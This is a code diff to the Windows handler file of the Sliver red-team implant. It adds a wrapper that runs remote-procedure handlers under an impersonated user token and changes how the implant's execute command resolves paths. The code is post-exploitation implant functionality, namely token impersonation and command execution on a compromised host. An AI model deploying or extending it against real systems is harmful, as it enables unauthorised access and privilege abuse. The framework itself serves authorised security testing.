@@ -24,6 +24,7 @@ import (
 	"fmt"
 	"io"
 	"os"
+	"runtime"
 
 	// {{if .Config.Debug}}
 	"log"
@@ -37,6 +38,7 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/registry"
 	"github.com/bishopfox/sliver/implant/sliver/service"
 	"github.com/bishopfox/sliver/implant/sliver/spoof"
+	"github.com/bishopfox/sliver/implant/sliver/syscalls"
 	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -118,6 +120,28 @@ var (
 // GetSystemHandlers - Returns a map of the windows system handlers
 func GetSystemHandlers() map[uint32]RPCHandler {
 	return windowsHandlers
+}
+
+func WrapperHandler(handler RPCHandler, data []byte, resp RPCResponse) {
+	if priv.CurrentToken != 0 {
+		err := syscalls.ImpersonateLoggedOnUser(priv.CurrentToken)
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Error: %v\n", err)
+			// {{end}}
+		}
+		runtime.LockOSThread()
+		defer runtime.UnlockOSThread()
+	}
+	handler(data, resp)
+	if priv.CurrentToken != 0 {
+		err := priv.TRevertToSelf()
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Error: %v\n", err)
+			// {{end}}
+		}
+	}
 }
 
 // ---------------- Windows Handlers ----------------
@@ -279,7 +303,16 @@ func executeWindowsHandler(data []byte, resp RPCResponse) {
 	}
 
 	execResp := &sliverpb.Execute{}
-	cmd := exec.Command(execReq.Path, execReq.Args...)
+	exePath, err := expandPath(execReq.Path)
+	if err != nil {
+		execResp.Response = &commonpb.Response{
+			Err: fmt.Sprintf("%s", err),
+		}
+		proto.Marshal(execResp)
+		resp(data, err)
+		return
+	}
+	cmd := exec.Command(exePath, execReq.Args...)
 
 	// Execute with current token
 	cmd.SysProcAttr = &syscall.SysProcAttr{}
